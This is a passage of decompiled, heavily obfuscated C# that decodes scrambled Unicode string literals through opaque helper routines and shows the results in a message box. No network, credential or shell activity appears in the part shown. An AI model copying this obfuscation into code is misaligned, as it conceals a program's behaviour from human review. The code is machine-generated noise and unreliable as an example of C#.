						_003CModule_003E.TAIWANLUNISOLAR(ref string_51, array54);
						num70 = Convert.ToInt32(string_51, _003CModule_003E.KeyValuePair__2[2]);
						break;
					}
					case 2:
						num70 = SAKA;
						break;
					case 3:
						num70 = Marshal.SizeOf(typeof(IsLogging));
						break;
					}
					num71 = num70;
					string_52 = string.Concat(char.ToString('웧'), "웣웣", "웣웢" + "웧웥웧웢웠웢");
					array55 = new object[6];
					num72 = ((-30392 >= Convert.ToInt32("2733566", 8)) ? (-897742) : 0);
					c18 = array[28];
				}
				array55[num72] = (int)c18;
				array55[1] = 84;
				array55[_003CModule_003E.ActivityOptions[0]] = (char)(array[29] | 'ᶓ');
				int num73 = Convert.ToInt32("3", 8);
				char c19 = (char)Convert.ToInt32("18ed", 16);
				array55[num73] = (char)(int)c19;
				int num74 = _003CModule_003E.ActivityOptions[3];
				array55[num74] = false;
				array55[Convert.ToInt32("5", 8)] = '\u20ce';
				_003CModule_003E.TAIWANLUNISOLAR(ref string_52, array55);
				array53[num71] = checked(Convert.ToInt32(string_52, 8) + Marshal.SizeOf(typeof(ErrorCode)));
				array53[Marshal.SizeOf(typeof(IsTvOS))] = (char)('鯧' & (array2[(nint)((Array)(object)"\u0312\u0347\u033e.\u0323\u0353\u0342\u0365\u032c\u030f\u0348\u0303\u0365.\u0352\u032d\u0355\u0314\u0311\u032f\u032b").LongLength] * Convert.ToInt32("10", 2)));
				_003CModule_003E.GetMaxByteCount(ref string_48, array53);
				unorderedNotEqualSignaling.ExecutionEngineException(string_48);
				unorderedNotEqualSignaling.ExecutionEngineException(text);
				string string_53 = string.Concat("휈휮", char.ToString('휸') + char.ToString('휸') + "휾휨");
				object[] array56 = new object[Convert.ToInt32("3", 8)];
				array56[Convert.ToInt32("0", Convert.ToInt32("20", 8))] = 16767;
				int num75 = checked(1 * Marshal.SizeOf(typeof(UseHebrewParsing)));
				int num76 = Convert.ToInt32("854", 16);
				array56[num75] = num76;
				array56[_003CModule_003E.ActivityOptions[Convert.ToInt32("0", 8)]] = (char)CoClass;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_53, array56);
				string text38 = string_53;
				string string_54 = string.Concat("אւ", "փ\u05f5" + "\u05c2\u05cf\u05ca\u05c7");
				object[] array57 = new object[5];
				array57[0] = (int)array[13];
				array57[checked(-983636 + Marshal.SizeOf(typeof(set_CultureName)))] = (byte)(-257416 + Marshal.SizeOf(typeof(Func__4))) != 0;
				array57[2] = string.Concat(char.ToString('ҵ'), char.ToString('ί'), char.ToString('`') + "Ó\u0019\r");
				int num77 = Convert.ToInt32("3", 16);
				array57[num77] = 8146;
				array57[(uint)array[5]] = "ĵ¹";
				_003CModule_003E.TAIWANLUNISOLAR(ref string_54, array57);
				string text39 = text38 + string_54;
				string string_55 = char.ToString((char)_003CModule_003E.KeyValuePair__2[131]) + "躭躪";
				object[] array58 = new object[Convert.ToInt32("6", array2[5])];
				array58[Convert.ToInt32("0", 2)] = (byte)((Array)(object)string.Empty).Length != 0;
				array58[1] = true;
				array58[10 % sizeof(int)] = 47;
				array58[(nint)((Array)(object)(char.ToString('\u0332') + "\u0323\u0310")).LongLength] = (byte)array[_003CModule_003E.ActivityOptions[2]] != 0;
				array58[(-85058 == array2[66]) ? (-251732) : 4] = ((Marshal.SizeOf(typeof(set_FullDateTimePattern)) != array2[67]) ? true : ((byte)Convert.ToInt32("fffbc0e9", 16) != 0));
				array58[5] = (byte)Convert.ToInt32("0", 16) != 0;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_55, array58);
				string text40 = string_55;
				string string_56 = string.Concat(char.ToString('核') + "栾栣", char.ToString('桬') + "栯栣" + "栨栩桬栻栭栿");
				object[] array59 = new object[Convert.ToInt32(char.ToString('1') + "00", 2)];
				array59[(Convert.ToInt32("138d6", 16) >= 634872) ? 12269 : 0] = string.Concat(char.ToString('㉛'), "龡ו" + "ޜ\u008c?_");
				int num78 = _003CModule_003E.ActivityOptions[2];
				int num79 = default(int);
				switch (checked(Convert.ToInt32("a36da", 16) + -669401))
				{
				case 0:
					num79 = 342135;
					break;
				case 1:
					num79 = 1456;
					break;
				case 2:
					num79 = Convert.ToInt32("11111111111111000011011111110001", 2);
					break;
				}
				array59[num78] = (char)num79;
				array59[2] = 119;
				array59[endAction] = (byte)Convert.ToInt32("0", array2[0]) != 0;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_56, array59);
				string text41 = text40 + string_56;
				string string_57 = string.Concat(char.ToString('㟨') + char.ToString('㞻') + "㞭㞦㞼㟦㟨", "㞑㞧" + "㞽㞺" + "㟨㞬㞭㞫㞺", "㞱㞸" + "㞼㞡㞧" + "㞦㟨㞣㞭㞱㟨㞡㞻㟨㞦㞧㞿㟨㞩㞾");
				object[] array60 = new object[checked(3 * Convert.ToInt32("1", 2))];
				int num80 = ((Convert.ToInt32("fffe8b19", 16) <= Convert.ToInt32("11111111111100111001101010110110", 2)) ? 780521 : 0);
				array60[num80] = 6418;
				array60[(uint)array[2]] = 26404;
				array60[2] = string.Concat(char.ToString('☕'), char.ToString((char)array2[68]), char.ToString('\u0b8b') + "\u0381\u000fK");
				_003CModule_003E.TAIWANLUNISOLAR(ref string_57, array60);
				string text42 = string_57;
				string string_58 = string.Concat(char.ToString('吟') + char.ToString('吗') + "吒吟吜吒", "君呐呞吧向吋呞吓吟吇" + "呞名吊" + "吟同吊呞吚君吝同吇后吊吗吐吙呞吇向吋同呞吘吗吒君名呞吐向吉呐");
				object[] array61 = new object[3];
				array61[0] = char.ToString((char)Convert.ToInt32("11011100010111", 2)) + char.ToString('Ȗ') + "ǰ\u0a92";
				array61[Convert.ToInt32("34c1f4c8", 16) / 885126344] = (char)Marshal.SizeOf(typeof(TaskCompleted));
				array61[2] = checked(-520282 - Convert.ToInt32("fff77eca", 16));
				_003CModule_003E.TAIWANLUNISOLAR(ref string_58, array61);
				string string_59 = string.Concat(text39, text41, text42 + string_58);
				int num81 = default(int);
				switch (5 % (_003CModule_003E.KeyValuePair__2[132] + -780499))
				{
				case 0:
					num81 = Convert.ToInt32("1117461046", 8) >> 11;
					break;
				case 1:
					num81 = ((Array)(object)("\u0351\u033a" + "\u034f\u0352\u0316\u0342\u0337\u034b\u0355\u0346\u0337\u0351\u0300\u0311\u0352\u0318\u031d\u031f\u036d\u0341")).Length;
					break;
				}
				object[] array62 = new object[num81 % 8];
				int num82 = ((Convert.ToInt32("10" + "11" + "1000000100110", 2) < -420134) ? 108284 : 0);
				string string_60 = string.Concat(char.ToString('구') + char.ToString('구') + "국구구", "국구", char.ToString('구') + "국국국구구구국국구구구");
				object[] obj3 = new object[6] { '䚨', null, null, null, null, null };
				int num83 = sizeof(bool);
				obj3[num83] = '屻';
				obj3[checked(Convert.ToInt32("510413", 8) + _003CModule_003E.ActivityOptions[119])] = 1431;
				obj3[3] = 479;
				obj3[Marshal.SizeOf(typeof(IsValidText))] = (byte)((Array)(object)string.Empty).Length != 0;
				obj3[array2[69] - -680617] = (char)_003CModule_003E.get_PositiveSign[33];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_60, obj3);
				array62[num82] = Convert.ToInt32(string_60, array2[70] >> (int)array[23]) >> (int)array4[8];
				char num84 = array4[1];
				int num85 = Marshal.SizeOf(typeof(get_Completion)) | Convert.ToInt32("34", 8);
				int num86 = 223652848 / _003CModule_003E.ActivityOptions[120];
				int num87 = default(int);
				switch (checked(sizeof(byte) * 1))
				{
				case 0:
					num87 = -965403;
					break;
				case 1:
					num87 = -901777;
					break;
				case 2:
					num87 = -220171;
					break;
				}
				array62[(uint)num84] = num85 & (num86 + num87);
				char c20 = (char)Marshal.SizeOf(typeof(ENODATA));
				array62[checked(unchecked((int)c20) * 1)] = (byte)SAKA != 0;
				string text43 = char.ToString('峠');
				string text44 = char.ToString('\u0b78');
				string string_61 = "떀ꐴ";
				object[] array63 = new object[4];
				array63[_003CModule_003E.ActivityOptions[1]] = ReadOnlyMemory__1;
				array63[1] = 4292;
				array63[Convert.ToInt32("2", array[21])] = ((_003CModule_003E.KeyValuePair__2[133] >= -320357) ? 18156 : (-385384));
				int num88 = Marshal.SizeOf(typeof(CharSetMask));
				array63[num88] = _003CModule_003E.ActivityOptions[20];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_61, array63);
				array62[3] = string.Concat(text43, text44 + string_61);
				_003CModule_003E.GetMaxByteCount(ref string_59, array62);
				string text45 = string_59;
				string text46 = char.ToString((char)Marshal.SizeOf(typeof(MoveLowToHigh)));
				int num89 = (((nint)((-91100 == ReadUInt64LittleEndian) ? 1 : 0) != (nint)((Array)(object)string.Empty).LongLength) ? 44853 : (-259580));
				string text47 = char.ToString((char)num89);
				string string_62 = char.ToString((char)_003CModule_003E.ActivityOptions[121]) + "㈳㈮";
				object[] array64 = new object[get_CurrencyGroupSeparator << Convert.ToInt32("1", 8)];
				array64[array2[71] ^ Convert.ToInt32("8fedb", 16)] = char.ToString('ㆫ') + "ᖆ⭊";
				int num90 = array2[sizeof(char)];
				int num91 = array2[72];
				array64[num90] = num91;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_62, array64);
				string text48 = text46 + text47 + string_62;
				int num92 = ((-15001 == Convert.ToInt32("37777742547", 8)) ? 44924 : 347548);
				string text49 = char.ToString((char)num92);
				string text50 = char.ToString('꼎');
				string string_63 = string.Concat("\uf7f5\uf7fa", "\uf7e7\uf7fb" + "\uf7f9\uf7e3\uf7f5\uf7e6\uf7f1");
				object[] array65 = new object[6];
				array65[Convert.ToInt32("0", 8)] = (byte)(518137 - Convert.ToInt32("7e7f9", 16)) != 0;
				int num93 = Convert.ToInt32("1", 16);
				array65[num93] = 2970;
				array65[2] = char.ToString('\u0b7c') + "Մē";
				array65[3] = _003CModule_003E.get_PositiveSign[34];
				int num94 = Convert.ToInt32("4", Convert.ToInt32("10000", 2));
				int num95 = Marshal.SizeOf(typeof(Log));
				array65[num94] = (char)num95;
				array65[Convert.ToInt32("31", 8) % 10] = Convert.ToInt32(char.ToString('1') + "50", 8);
				_003CModule_003E.TAIWANLUNISOLAR(ref string_63, array65);
				string string_64 = string.Concat(text48, text49 + text50 + string_63);
				int num96 = checked(WaiterStates - 784513);
				object[] array66 = new object[num96 ^ (_003CModule_003E.KeyValuePair__2[24] & 0x2BE65)];
				nint num97 = 0 | ((nint)((Array)(object)string.Empty).LongLength << get_BytesUnknown + 317849);
				int num98;
				if (45293 > (-813985 ^ Convert.ToInt32("10110001001110101111", 2)) / 1)
				{
					char c21 = (char)Convert.ToInt32("100" + "1000" + "10111011", 2);
					num98 = c21;
				}
				else
				{
					num98 = Marshal.SizeOf(typeof(TInput));
				}
				array66[num97] = num98;
				array66[HasFlagsAttribute] = array6[HasFlagsAttribute];
				_003CModule_003E.GetMaxByteCount(ref string_64, array66);
				string text51 = string_64;
				char c22 = (char)(array2[1] << 29);
				MessageBox.Show(text45, text51, (MessageBoxButtons)(int)c22, (MessageBoxIcon)64);
				return true;
			}
			string text52 = char.ToString('讍');
			string text53 = char.ToString((char)Marshal.SizeOf(typeof(ECONNRESET)));
			string string_65 = "息恚";
			object[] array67 = new object[4 | Convert.ToInt32("100", 2)];
			array67[_003CModule_003E.ActivityOptions[1]] = false;
			array67[2112654305 / array2[73]] = 134;
			array67[_003CModule_003E.ActivityOptions[Convert.ToInt32("0", 8)]] = char.ToString('㼏') + char.ToString('\u0002') + "\u0004\v";
			array67[3] = 44092;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_65, array67);
			string text54 = text52 + text53 + string_65;
			string text55 = char.ToString((char)Beq);
			string text56 = char.ToString((char)Marshal.SizeOf(typeof(SizeBeforeBytes)));
			string string_66 = char.ToString('湯') + char.ToString('渽') + "湮湸";
			object[] array68 = new object[5];
			array68[0] = (byte)array2[1] != 0;
			array68[1] = 949;
			array68[(uint)array[0]] = 395;
			array68[Marshal.SizeOf(typeof(CharSetMask))] = 6436;
			char c23 = (char)Convert.ToInt32("4", 16);
			array68[(int)c23] = char.ToString('鑍') + char.ToString('ဟ') + "ᅖᇊ";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_66, array68);
			string text57 = text55 + text56 + string_66;
			string string_67 = string.Concat(char.ToString('닑') + char.ToString('닋') + "늟닖닑닉", "닞닓닖" + "닛늟닛닖닌닜");
			object[] array69 = new object[6];
			array69[0] = (byte)Convert.ToInt32("0", 2) != 0;
			array69[1] = string.Concat(char.ToString('÷'), char.ToString('+') + "\r\u0003");
			array69[(67187 >= Convert.ToInt32("11111111111111100001010110011100", 2)) ? 2 : (-876751)] = (char)(~Convert.ToInt32("11111111111111111110000011011110", 2));
			array69[(uint)array[4]] = 'ॷ';
			array69[Marshal.SizeOf(typeof(IsValidText))] = char.ToString('-') + char.ToString('\u0006') + "\t\v";
			array69[(uint)array[Convert.ToInt32("6", 8)]] = Convert.ToInt32(char.ToString('7') + char.ToString('5') + "01", 8);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_67, array69);
			string text58 = string_67;
			string string_68 = string.Concat(char.ToString('煪') + char.ToString('煷') + "煡焥", char.ToString('煢') + "煬煣", char.ToString('煱') + "焥煉" + "煬煫煮焫煥煥煥");
			object[] array70 = new object[checked(127428 + array2[74])];
			int num99 = default(int);
			switch (Convert.ToInt32("11101111010010101100", 2))
			{
			case 980140:
				num99 = 0;
				break;
			case 980141:
				num99 = -407629;
				break;
			}
			int num100 = num99;
			char c24 = (char)Convert.ToInt32("100111001110111", 2);
			array70[num100] = (int)c24;
			array70[1] = 30667;
			array70[Convert.ToInt32("3d62236e", 16) / 514920887] = 13478;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_68, array70);
			string string_69 = string.Concat(text54, text57, text58 + string_68);
			object[] array71 = new object[~Marshal.SizeOf(typeof(GetPermission)) + _003CModule_003E.get_PositiveSign[35] >> checked(12 * (Convert.ToInt32("111000001011000111", 2) + -230086))];
			string string_70;
			object[] array72;
			checked
			{
				int num101 = ((Marshal.SizeOf(typeof(List__1)) + unchecked(-994111 / get_CurrencyGroupSeparator) == -94739) ? (-412926) : unchecked(Convert.ToInt32("37" + "77" + "4525075", 8) - -873923));
				int num102 = default(int);
				switch ((_003CModule_003E.get_PositiveSign[139] >> Convert.ToInt32("1", 2)) - ((Marshal.SizeOf(typeof(get_Namespace)) > _003CModule_003E.ActivityOptions[122]) ? 624277 : 810975))
				{
				case 0:
					num102 = 356742;
					break;
				}
				int num103 = num102;
				int num104 = ((77785 != TraceLoggingEventTypes) ? (-901003) : PARAMFLAG_FHASDEFAULT);
				array71[num101] = unchecked(num103 - (num104 << get_CurrencyGroupSeparator));
				array71[unchecked((uint)array4[1])] = unchecked(Convert.ToInt32("1174351", 8) - 781886 - 285645) - unchecked(32119 - Marshal.SizeOf(typeof(Struct1)));
				int num105 = ((30758 <= HelpLink) ? 133179 : _003CModule_003E.ActivityOptions[123]);
				array71[(num105 | Mode) + unchecked(array2[22] * (nint)((Array)(object)("\u030d\u0314" + "\u033e\u0320" + "\u032d\u033c\u030d\u0303\u0339\u032e\u036b")).LongLength)] = (Convert.ToInt32("1111" + "1111111101001001000110101001", 2) ^ unchecked(-250785 + Marshal.SizeOf(typeof(syskind)))) * HebrewNumberParsingContext;
				_003CModule_003E.GetMaxByteCount(ref string_69, array71);
				unorderedNotEqualSignaling.ExecutionEngineException(string_69);
				string_70 = "ጣጄ";
				array72 = new object[Convert.ToInt32("11", array2[0])];
			}
			int num106 = ReadUInt32BigEndian - Convert.ToInt32("fff6eede", 16);
			int num107 = Convert.ToInt32("6117", 8);
			array72[num106] = num107;
			array72[1] = Marshal.SizeOf(typeof(Permission));
			array72[Convert.ToInt32("2", 16)] = 321;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_70, array72);
			string text59 = string_70;
			string text60 = char.ToString((char)Convert.ToInt32(char.ToString('3') + "d1", 16));
			string string_71 = "\uef52\uef5f";
			int num108 = default(int);
			switch (662565 + Convert.ToInt32("37775361733", 8))
			{
			case 0:
				num108 = 3;
				break;
			}
			object[] array73 = new object[num108];
			array73[checked(Convert.ToInt32("37777023044", 8) + 252380)] = (byte)((uint)array2[2] & (false ? 1u : 0u)) != 0;
			array73[1] = array[14];
			array73[~array2[39]] = 'ꚤ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_71, array73);
			string text61 = text60 + string_71;
			string text62 = char.ToString('ώ');
			int num109 = array2[75];
			string text63 = char.ToString((char)num109);
			string string_72 = string.Concat(char.ToString('拓'), char.ToString('𤋮') + "碑節祖祉");
			object[] array74 = new object[Convert.ToInt32(char.ToString('1') + "00", 2)];
			int num110 = get_PositiveInfinity;
			int num111 = ((1 != Convert.ToInt32("0", 2)) ? 6788 : 362722);
			array74[num110] = num111;
			int num112 = get_CurrencyGroupSeparator;
			char c25 = (char)get_PositiveInfinity;
			array74[num112] = (byte)(int)c25 != 0;
			array74[(uint)array[0]] = Convert.ToInt32("111011" + "101011001", 2);
			array74[_003CModule_003E.KeyValuePair__2[0]] = 26536;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_72, array74);
			string string_73 = string.Concat(text59, text61, text62 + text63 + string_72);
			string string_74 = string.Concat(char.ToString((char)Convert.ToInt32("155463", 8)), char.ToString((char)_003CModule_003E.KeyValuePair__2[134]), char.ToString('\udb34') + "\udb34\udb34\udb35\udb36");
			object[] array75 = new object[6];
			array75[(nint)((Array)(object)string.Empty).LongLength] = Convert.ToInt32(char.ToString('5') + "35e", 16);
			array75[Convert.ToInt32("1", sizeof(Guid))] = (char)checked(_003CModule_003E.ActivityOptions[124] + 270064);
			array75[(nint)((Array)(object)"\u0345\u0316").LongLength] = false;
			array75[Marshal.SizeOf(typeof(CharSetMask))] = char.ToString((char)ReciprocalEstimate) + "\u0001\u0002";
			array75[Convert.ToInt32("37774671713", 8) ^ -822321] = Marshal.SizeOf(typeof(StringComparer));
			array75[5] = -132146 + Convert.ToInt32("467102", 8);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_74, array75);
			object[] array76 = new object[checked(Convert.ToInt32(string_74, Marshal.SizeOf(typeof(__c__DisplayClass0_6))) - 580450)];
			int num113 = ((0 != Convert.ToInt32("0", Convert.ToInt32("2", 8))) ? (-521520) : (-1710));
			int num114;
			if (num113 != _003CModule_003E.LoadVector128[19])
			{
				string string_75 = string.Concat(char.ToString('च'), char.ToString('च'), char.ToString('च') + char.ToString('\u094e') + "टङङ\u0948");
				object[] array77 = new object[4];
				char c26 = array[1];
				array77[(int)c26] = array2[23];
				array77[1] = 246;
				array77[Convert.ToInt32("3", 16) & _003CModule_003E.ActivityOptions[0]] = 339382585 >> get_IsJITTrackingEnabled;
				array77[~_003CModule_003E.get_PositiveSign[110]] = ']';
				_003CModule_003E.TAIWANLUNISOLAR(ref string_75, array77);
				num114 = Convert.ToInt32(string_75, 16);
			}
			else
			{
				num114 = 0;
			}
			int num115 = num114;
			string string_76 = string.Concat(char.ToString('\u9ffd'), char.ToString('\u9ffd'), char.ToString('\u9ffd') + char.ToString('\u9ffd') + "\u9ffd\u9ffd龬鿸");
			object[] array78 = new object[Convert.ToInt32(char.ToString('1') + "00", 2)];
			array78[0] = 16593;
			array78[1] = 7814;
			array78[Marshal.SizeOf(typeof(ENODATA))] = string.Concat(char.ToString('\u1ccb'), char.ToString('\u030a'), char.ToString('ơ') + "íˎ");
			array78[Convert.ToInt32("3", Convert.ToInt32("1000", 2))] = 6931;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_76, array78);
			array76[num115] = ~Convert.ToInt32(string_76, 16);
			int num116 = sizeof(sbyte) * (Convert.ToInt32("5", 16) % 2);
			string string_77 = string.Concat(char.ToString('緧') + char.ToString('緧') + "緧緧", "緧緧緧" + char.ToString('緧') + "緧緧緧緧緦緧緧緧緦緧緧緦緧緦緧緦緧緧緦緧緦緧緦緧");
			object[] array79 = new object[5];
			array79[202304 - Convert.ToInt32("613100", 8)] = (char)((Convert.ToInt32("1101101111000001", 2) == array[30]) ? 'K' : 173220u);
			int num118 = default(int);
			checked
			{
				array79[Convert.ToInt32("37776567321", 8) + 332080] = '\u0e69';
				array79[Convert.ToInt32("10170", 8) >> Marshal.SizeOf(typeof(ENXIO))] = 15470;
				int num117 = default(int);
				switch (456631 - Convert.ToInt32("6f7b7", 16))
				{
				case 0:
					num117 = 3;
					break;
				}
				array79[num117] = 'ჸ';
				array79[get_ResourceExposureLevel | 4] = '↼';
				_003CModule_003E.TAIWANLUNISOLAR(ref string_77, array79);
				switch (Convert.ToInt32(string_77, -2 * Convert.ToInt32("11111111111111111111111111111111", 2)) + 562476)
				{
				case 0:
				{
					int num119 = Convert.ToInt32("1000000100000000001", 2);
					num118 = num119 | (-798977 * Convert.ToInt32("ffffffff", 16));
					break;
				}
				case 1:
					num118 = 0;
					break;
				}
			}
			array76[num116] = (byte)num118 != 0;
			array76[checked(unchecked(-87883 * array2[38]) - 439417) * ((_003CModule_003E.ActivityOptions[125] % 80534 < 4626565 % _003CModule_003E.KeyValuePair__2[136]) ? Convert.ToInt32(char.ToString('f') + char.ToString('f') + "ffffff", sizeof(Guid)) : 246719)] = 451;
			char c27 = (char)Convert.ToInt32("3", 16);
			char c28 = (char)(int)c27;
			array76[(int)c28] = ((-2235 <= Id * -4) ? Convert.ToInt32(char.ToString('3') + "77" + "76376060", 8) : (-771760)) - (_003CModule_003E.KeyValuePair__2[25] + -59391);
			string text64 = char.ToString((char)checked(11 * _003CModule_003E.KeyValuePair__2[0]));
			char c29 = (char)Convert.ToInt32("52", 8);
			string text65 = char.ToString(c29);
			string text66 = char.ToString((char)((-42064 <= _003CModule_003E.KeyValuePair__2[137]) ? 680242u : '1'));
			int num120 = ((((-28889 < Convert.ToInt32("11010100001011010100", 2)) ? 1 : 0) != _003CModule_003E.ActivityOptions[1]) ? 3 : Convert.ToInt32("fff877d3", 16));
			string text67 = char.ToString((char)num120);
			string string_78 = char.ToString('須') + "須頊";
			object[] array80 = new object[6];
			array80[array2[(nint)((Array)(object)".").LongLength]] = 32768;
			array80[Marshal.SizeOf(typeof(UseHebrewParsing))] = string.Concat("í2", char.ToString('!') + char.ToString('U') + "\u001b8");
			array80[2] = 2202;
			array80[3] = 1980;
			array80[4] = 1482;
			array80[25 % Convert.ToInt32("a", 16)] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_78, array80);
			array76[4] = string.Concat(text64, text65, text66 + text67 + string_78);
			_003CModule_003E.GetMaxByteCount(ref string_73, array76);
			string text68 = string_73;
			string text69 = char.ToString((char)Convert.ToInt32(char.ToString('4') + char.ToString('5') + "462", array[7]));
			string text70 = char.ToString(array[array2[35]]);
			string string_79 = "觸觾";
			object[] array81 = new object[Convert.ToInt32("5", 8)];
			array81[0] = string.Concat(char.ToString('෦'), char.ToString((char)Marshal.SizeOf(typeof(ComWrappers))), char.ToString('\u1ae6') + "ˋሎ");
			array81[get_CurrencyGroupSeparator] = string.Concat("\u1088\u030a", char.ToString('ª') + "\v\u0002\0\u0002");
			array81[sizeof(ushort) * Convert.ToInt32("1", 2)] = 11074;
			array81[Convert.ToInt32("3", 16)] = 11394;
			array81[4] = array2[24];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_79, array81);
			string text71 = text69 + text70 + string_79;
			string string_80 = string.Concat(char.ToString((char)Convert.ToInt32("a260", 16)), char.ToString('ꈯ') + "ꉝꉮ");
			object[] array82 = new object[Convert.ToInt32("4", 16) * 1];
			array82[checked(array2[1] * 637926)] = string.Concat(char.ToString('翥'), char.ToString((char)Format8), char.ToString('\u035b') + "থ=\u0002w");
			array82[1] = (int)array[GCHeapDumpKeyword];
			array82[2] = (byte)checked(Convert.ToInt32("37774724066", 8) - -808906) != 0;
			array82[endAction] = 14948;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_80, array82);
			string text72 = string_80;
			string string_81 = string.Concat(char.ToString('סּ'), char.ToString('ﭜ') + "נּ\ufb42ﭘפֿﭝתּ");
			int num121 = sizeof(int);
			object[] array83 = new object[num121];
			array83[0] = Convert.ToInt32("11" + "01" + "101001", 2);
			array83[1] = 34661;
			array83[sizeof(char)] = 6977;
			char num122 = array[4];
			char c30 = array[31];
			array83[(uint)num122] = (char)(int)c30;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_81, array83);
			string string_82 = string.Concat(text71, text72 + string_81);
			string string_83 = string.Concat(char.ToString('꼨') + "꼨꼨", char.ToString('꼨') + char.ToString('꼨') + "꼨꼨꼨", "꼨꼨꼨꼨꼨" + "꼨꼨꼨꼨꼨꼨꼨" + "꼨꼨꼨꼨꼨꼨꼨꼨꼨꼩꼨꼩");
			object[] array84 = new object[6];
			array84[Convert.ToInt32("0", 2)] = string.Concat(char.ToString(array[32]), char.ToString('ȸ') + "ߛߓ");
			array84[1] = 6864;
			char c31 = (char)Marshal.SizeOf(typeof(ENODATA));
			array84[(int)c31] = 24305;
			array84[Convert.ToInt32("3", 8)] = false;
			array84[(uint)array[Convert.ToInt32("5", 16)]] = 3015;
			array84[5] = 4032;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_83, array84);
			object[] array85 = new object[~Convert.ToInt32(string_83, sizeof(ushort))];
			int num124;
			int[] calendarType;
			checked
			{
				int num123 = default(int);
				switch (EAFNOSUPPORT - array6[8])
				{
				case 0:
				{
					int isNestedFamANDAssem = IsNestedFamANDAssem;
					num123 = isNestedFamANDAssem;
					break;
				}
				case 1:
					num123 = Convert.ToInt32("33367615", 8) >> 5 >> Marshal.SizeOf(typeof(GetInterfaceImplementation));
					break;
				case 2:
					num123 = _003CModule_003E.LoadVector128[-896055 + Convert.ToInt32("11011010110001001011", 2)];
					break;
				}
				num124 = num123;
				calendarType = _003CModule_003E.CalendarType;
			}
			char c32 = (char)Convert.ToInt32("10", 2);
			array85[num124] = calendarType[(int)c32];
			bool num125 = Convert.ToInt32(char.ToString('f') + char.ToString('f') + "f6eabb", sizeof(decimal)) + Convert.ToInt32(char.ToString('1') + "731375", 8) < 859169;
			int num126 = default(int);
			switch (280656 + (Convert.ToInt32("ffffffb1", 16) & -280584))
			{
			case 0:
				num126 = 0;
				break;
			}
			int num127;
			if ((num125 ? 1 : 0) == num126)
			{
				char c33 = (char)_003CModule_003E.ActivityOptions[2];
				checked
				{
					num127 = 129367 * unchecked((int)c33);
				}
			}
			else
			{
				num127 = 1;
			}
			int num128 = num127;
			int num129 = _003CModule_003E.ActivityOptions[21];
			array85[num128] = (char)(~num129);
			int num130 = _003CModule_003E.LoadVector128[Convert.ToInt32(char.ToString('1') + "0101", 2)];
			string string_84 = string.Concat(char.ToString((char)_003CModule_003E.get_PositiveSign[140]), char.ToString('풧'), char.ToString('풤') + "풣풢풡");
			object[] array86 = new object[(uint)array[6]];
			array86[Convert.ToInt32("0", 16)] = 8673;
			int num131 = array2[2];
			int num132 = Convert.ToInt32("0", 2);
			array86[num131] = (byte)num132 != 0;
			array86[2] = Convert.ToInt32("fffd7961", 16) - -166690;
			array86[checked(_003CModule_003E.ActivityOptions[86] * -1)] = (char)Marshal.SizeOf(typeof(Semaphore));
			array86[4] = _003CModule_003E.get_PositiveSign[141] + 513504;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_84, array86);
			int num133 = num130 ^ Convert.ToInt32(string_84, 8);
			string string_85 = string.Concat(char.ToString('\u1b3c'), char.ToString('\u1b3f'), char.ToString('\u1b3e') + "\u1b39\u1b6b");
			object[] array87 = new object[3];
			array87[Convert.ToInt32("6fab4", 16) + array2[76]] = string.Concat(char.ToString((char)remove_UnhandledException), char.ToString((char)Convert.ToInt32("100001011", 2)), char.ToString('\b') + "\a\u0004\0\u0003");
			array87[1] = (byte)(ShiftRightLogicalNarrowingSaturateLower - Marshal.SizeOf(typeof(TryReadUInt16BigEndian))) != 0;
			int num134 = Convert.ToInt32("2", 16);
			array87[num134] = string.Concat(char.ToString((char)_003CModule_003E.ActivityOptions[126]), char.ToString('Ç') + "܅@)Ė");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_85, array87);
			int num135 = Convert.ToInt32(string_85, 16);
			int num136 = Marshal.SizeOf(typeof(ContractFailureKind));
			int num140;
			if (num135 != num136)
			{
				checked
				{
					bool num137 = 594400 + Convert.ToInt32("fff58c06", 16) == -98580;
					int num138 = Convert.ToInt32("0", 2);
					int num139 = (((num137 ? 1 : 0) != num138) ? array2[25] : (-813722 - array2[77]));
					num140 = num139;
				}
			}
			else
			{
				num140 = array2[array2[41]] - Convert.ToInt32(char.ToString('3') + char.ToString('7') + "776534272", 8);
			}
			array85[num133] = num140;
			array85[array6[(nint)((Array)(object)string.Empty).LongLength]] = (byte)(array6[2] * (-880552 / (nint)((Array)(object)"\u030f").LongLength)) != 0;
			int num141 = _003CModule_003E.KeyValuePair__2[26];
			int num142 = checked(-133264 - num141);
			string text73 = char.ToString((char)checked(Overlaps - -444416));
			string string_86 = char.ToString('剁') + char.ToString('剆') + "剅剆";
			object[] array88 = new object[Marshal.SizeOf(typeof(Stelem_Ref))];
			array88[0] = "Ĕǘ";
			array88[get_CurrencyGroupSeparator | Convert.ToInt32("0", 8)] = false;
			array88[2] = '\u05bd';
			array88[Convert.ToInt32("11", 2)] = string.Concat("ᘁ⭅", char.ToString('7') + char.ToString('\u000e') + "\u0004\u0006");
			array88[4] = _003CModule_003E.KeyValuePair__2[op_LessThan];
			array88[array2[4]] = 1933;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_86, array88);
			array85[num142] = Convert.ToInt32(text73 + string_86, ~(CompatibilitySwitch * -1));
			_003CModule_003E.GetMaxByteCount(ref string_82, array85);
			string text74 = string_82;
			int num143 = default(int);
			switch (0 / (635354962 / ((Convert.ToInt32("cfef", 16) > -149800) ? 2042942 : array2[78])))
			{
			case 0:
			{
				int num144;
